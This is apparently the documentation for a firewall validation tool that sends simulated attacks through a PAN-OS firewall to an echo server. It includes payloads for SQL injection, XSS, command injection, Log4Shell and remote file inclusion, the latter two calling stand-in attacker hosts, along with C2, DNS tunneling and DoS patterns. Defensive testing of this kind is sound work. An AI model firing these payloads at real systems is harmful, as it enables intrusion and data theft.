# Security Testing Guide

Validate PAN-OS NGFW security profiles (Vulnerability Protection, Anti-Virus, URL Filtering) using built-in attack simulations. The security testing suite sends known attack patterns through the network and determines whether the firewall blocks them.

## Prerequisites

- Traffic Generator client and server deployed (see [README](README.md))
- For full validation: PAN-OS NGFW inline between client and server with:
  - **Vulnerability Protection** profile (for web attack detection)
  - **Anti-Virus / Threat Prevention** profile (for malware detection)
  - **SSL Decryption** policy (for HTTPS-based malware detection)
  - **URL Filtering** profile (for URL category blocking)
  - **Anti-Spyware** profile (for DNS-based attacks and C2 detection)
  - **Zone Protection** profile (for brute-force and DoS detection)

## Quick Start

1. Open the client dashboard: `https://<client-ip>:8443`
2. Scroll down to the **Security Testing** section (click to expand)
3. Select tests or click a category header checkbox to select all tests in that category
4. Click **Run Selected** to run all checked tests, or click the **▶** button next to any individual test to run just that one
5. Watch results update in real-time

## Test Categories

### Web Attacks (Vulnerability Protection)

Tests OWASP Top 10 attack patterns. Each test sends a crafted HTTP request to the echo server (port 9999), which reflects the payload back. A firewall with Vulnerability Protection should detect and block the malicious pattern in the request or response.

| Test | Attack Pattern | What It Does |
|------|---------------|--------------|
| SQL Injection — UNION SELECT | `' UNION SELECT username,password FROM users--` | Sends UNION-based SQLi in URL query parameter |
| SQL Injection — OR 1=1 | `' OR '1'='1' --` | Sends boolean-based SQLi to bypass authentication |
| SQL Injection — DROP TABLE | `'; DROP TABLE users; --` | Sends destructive SQLi statement |
| XSS — Script Tag | `<script>alert('XSS')</script>` | Sends reflected XSS via script tag |
| XSS — IMG onerror | `<img src=x onerror=alert('XSS')>` | Sends XSS via image error handler |
| XSS — SVG onload | `<svg onload=alert('XSS')>` | Sends XSS via SVG element |
| Command Injection — cat | `; cat /etc/passwd` | Sends OS command injection |
| Command Injection — Pipe | `| ls -la /` | Sends command injection via pipe |
| Command Injection — Backtick | `` `whoami` `` | Sends command injection via backtick |
| Path Traversal | `../../../../etc/passwd` | Sends directory traversal attack |
| Log4Shell — JNDI Lookup | `${jndi:ldap://attacker.com/exploit}` | Sends Log4j RCE payload in HTTP header |
| XXE — XML External Entity | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | Sends XXE payload via POST with XML content type |
| SSRF — Server-Side Request Forgery | `http://169.254.169.254/latest/meta-data/` | Sends SSRF targeting cloud metadata endpoint |
| SSTI — Template Injection | `{{7*7}}${7*7}` | Sends template expression payloads |
| LDAP Injection | `*)(&(objectClass=*))(uid=*)` | Injects LDAP filter metacharacters |
| XPath Injection | `' or '1'='1' or ''='` | Injects XPath query syntax |
| CRLF / Header Injection | `%0d%0aSet-Cookie: malicious=true` | Injects CRLF into HTTP headers |
| Open Redirect | `https://evil.example.com/phishing` | Sends redirect parameter to external site |
| Blind SQL Injection | `' AND SLEEP(5)-- -` | Sends time-based blind SQLi payload |
| Insecure Deserialization | `rO0ABXNy...` (Java serialized object) | Sends serialized Java object payload |
| Shellshock — CVE-2014-6271 | `() { :;}; /bin/cat /etc/passwd` | Sends Shellshock exploit in HTTP headers |
| Remote File Inclusion | `http://evil.example.com/shell.txt%00` | Sends RFI payload in URL parameter |
| Information Disclosure | `phpinfo.php\|.env\|.git/config` | Probes common info disclosure paths |

### Malware/Threats (Anti-Virus & Anti-Spyware)

Tests malware download detection and threat signature matching.

| Test | What It Does | PAN-OS Feature |
|------|-------------|----------------|
| EICAR Download — HTTP | Downloads EICAR test file over HTTP (port 9999) | Anti-Virus |
| EICAR Download — HTTPS | Downloads EICAR test file over HTTPS (port 443) | Anti-Virus (requires SSL Decryption) |
| EICAR in ZIP — HTTP | Downloads EICAR inside a ZIP archive over HTTP | Anti-Virus |
| C2 Callback Pattern | Sends HTTP POST with encoded data mimicking C2 beacon | Anti-Spyware |
| Malicious User-Agent | Sends HTTP request with known malware User-Agent string | Anti-Spyware |

> **Note on EICAR over HTTPS**: The EICAR HTTPS test will only show PASS (blocked) if the firewall has an active **SSL Decryption** policy decrypting traffic to the server. Without SSL Decryption, the firewall cannot inspect the encrypted payload and the test will show FAIL (passed through).

### URL Filtering

Tests PAN-OS URL Filtering using PAN-DB category test URLs.

| Test | Default URL | PAN-DB Category |
|------|------------|-----------------|
| URL Category — Malware | `http://urlfiltering.paloaltonetworks.com/test-malware` | malware |
| URL Category — Phishing | `http://urlfiltering.paloaltonetworks.com/test-phishing` | phishing |
| URL Category — Hacking | `http://urlfiltering.paloaltonetworks.com/test-hacking` | hacking |
| URL Category — Proxy/Anonymizer | `http://urlfiltering.paloaltonetworks.com/test-proxy-avoidance-and-anonymizers` | proxy avoidance and anonymizers |

> **Note**: URL Filtering test URLs can be customized in the dashboard config fields before running tests.

### DNS-Based Attacks (Anti-Spyware)

Tests DNS-level threat detection capabilities.

| Test | What It Does | Detection Target |
|------|-------------|-----------------|
| DNS Tunneling Detection | Sends DNS queries with long, base64-encoded subdomain labels | Anomalous DNS query patterns (iodine, dnscat2) |
| DGA Domain Detection | Queries multiple high-entropy, algorithmically-generated domains | DGA-based botnet C2 communication |
| DNS Rebinding Attempt | Queries domain with private IP resolution pattern | DNS rebinding bypass attempts |

### Protocol Abuse (Vulnerability Protection)

Tests protocol-level abuse detection.

| Test | What It Does | Detection Target |
|------|-------------|-----------------|
| SSH Brute Force Pattern | Rapid successive SSH connection attempts | Brute-force attack detection |
| FTP Bounce Scan | Sends FTP PORT command targeting internal IPs | FTP bounce scan reconnaissance |
| HTTP Request Smuggling | Sends conflicting Content-Length / Transfer-Encoding headers | Request smuggling attacks |
| Slowloris DoS Pattern | Opens connection with slow partial header delivery | Slow-rate DoS detection |

### File-Based Threats (Anti-Virus / File Blocking)

Tests file type detection and blocking.

| Test | What It Does | Detection Target |
|------|-------------|-----------------|
| PDF with Embedded JavaScript | Downloads PDF with JavaScript `app.alert` action | PDF active content blocking |
| Office Document with VBA Macro | Downloads file with OLE2 header and VBA `AutoOpen` macro | Office macro malware blocking |
| PE Executable Download — HTTP | Downloads Windows PE file (MZ/PE header) over HTTP | Executable file type blocking |

## Understanding Results

Each test produces a verdict:

| Verdict | Meaning | Color |
|---------|---------|-------|
| **PASS** | Firewall blocked the attack (connection reset, timeout, block page, or HTTP 403) | Green |
| **FAIL** | Attack passed through the firewall undetected (HTTP 200 with payload intact) | Red |
| **ERROR** | Network error unrelated to firewall (DNS failure, server unreachable) | Yellow |

### How Detection Works

The engine determines whether the firewall blocked a request based on these signals:

- **Connection Reset / Timeout**: TCP RST or timeout indicates the firewall dropped the connection (PASS)
- **Block Page**: Response containing PAN-OS block page markers like "Palo Alto" or "URL Filtering" (PASS)
- **HTTP 403**: Server responded with forbidden, likely a firewall inject (PASS)
- **HTTP 200 with payload**: Echo server reflected the attack payload back — firewall did not intervene (FAIL)

## Configuration Options

In the Security Testing panel header:

| Field | Default | Description |
|-------|---------|-------------|
| HTTP Port | 9999 | Port for HTTP-based tests (echo server) |
| HTTPS Port | 443 | Port for HTTPS-based tests (nginx) |
| Interval | 2 | Seconds between each test execution |

## Usage Scenarios

### Scenario 1: Validate Vulnerability Protection Profile

1. Select all **Web Attacks** tests
2. Click **Run Selected**
3. **Expected with firewall**: All 11 tests show PASS (blocked)
4. **Without firewall**: All tests show FAIL (passed through) — this confirms the tests are working correctly

### Scenario 2: Validate Anti-Virus with SSL Decryption

1. Select **EICAR Download — HTTP**, **EICAR Download — HTTPS**, and **EICAR in ZIP**
2. Click **Run Selected**
3. **Expected results**:
   - EICAR HTTP: PASS (blocked by Anti-Virus)
   - EICAR HTTPS: PASS only if SSL Decryption is enabled; FAIL if not
   - EICAR ZIP: PASS (blocked by Anti-Virus)

### Scenario 3: Validate URL Filtering

1. Select all **URL Filtering** tests
2. Click **Run Selected**
3. **Expected with URL Filtering profile**: All tests show PASS (blocked)
4. Demonstrates PAN-DB category-based URL blocking

### Scenario 4: Run Individual Tests

1. Find the specific test you want to run
2. Click the **▶** (play) button next to it — runs just that single test
3. The test executes immediately without affecting other tests
4. Useful for re-running a specific test after making firewall policy changes

### Scenario 5: Edit a Built-in Test

1. Click the **✏** (edit) button next to any test — works on built-in and custom tests
2. Modify the payload, method, headers, description, or target path
3. Click **Save** — built-in test edits are saved as overrides (original is preserved)
4. Modified tests show a "modified" badge
5. Click **↺** (reset) to restore the original built-in test configuration

### Scenario 6: Full Security Profile Validation

1. Click the header checkbox for each category to select all tests (or select individual tests)
2. Click **Run Selected** — all 30 tests run sequentially
3. Review the summary bar: green (passed/blocked), red (failed/passed through), yellow (errors)
4. Use results to demonstrate firewall effectiveness during PoC

## API Reference

The security testing engine exposes these REST endpoints:

```
GET  /api/security/catalog              — List all available tests grouped by category
POST /api/security/start                — Start tests: {"tests": ["sqli_union", "xss_script", ...], "config": {"http_port": 9999, "https_port": 443, "interval": 2}}
POST /api/security/stop                 — Stop running tests
GET  /api/security/status               — Get current status, results, and logs
POST /api/security/clear                — Clear all results and logs
GET  /api/security/patterns             — List custom attack patterns
POST /api/security/patterns             — Add custom pattern
PUT  /api/security/patterns/<id>        — Update custom pattern
DELETE /api/security/patterns/<id>      — Delete custom pattern
GET  /api/security/builtin/<id>         — Get original built-in test (before override)
PUT  /api/security/builtin/<id>         — Save override for a built-in test
DELETE /api/security/builtin/<id>       — Reset built-in test to default
```

### Example: Run all web attack tests via curl

```bash
# Get test catalog
curl -s http://<client-ip>:8080/api/security/catalog | jq .

# Start specific tests
curl -X POST http://<client-ip>:8080/api/security/start \
  -H 'Content-Type: application/json' \
  -d '{"tests": ["sqli_union", "xss_script", "eicar_http", "dns_tunnel", "pe_download"], "config": {"interval": 2}}'

# Check status
curl -s http://<client-ip>:8080/api/security/status | jq .

# Stop tests
curl -X POST http://<client-ip>:8080/api/security/stop
```

## Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| All tests show FAIL | No firewall inline, or security profiles not applied | Verify PAN-OS security policy with correct profiles is applied to the traffic flow |
| EICAR HTTPS shows FAIL but HTTP shows PASS | SSL Decryption not enabled | Configure SSL Decryption policy on PAN-OS to decrypt traffic to the server |
| URL Filtering tests show ERROR | Test URLs unreachable | Check DNS resolution and internet connectivity from the client container |
| All tests show ERROR | Server unreachable | Verify server container is running and reachable from client (`ping <server-ip>`) |
| Web attack tests show PASS without firewall | Echo server not running | Check server container logs: `docker logs traffic-server` |
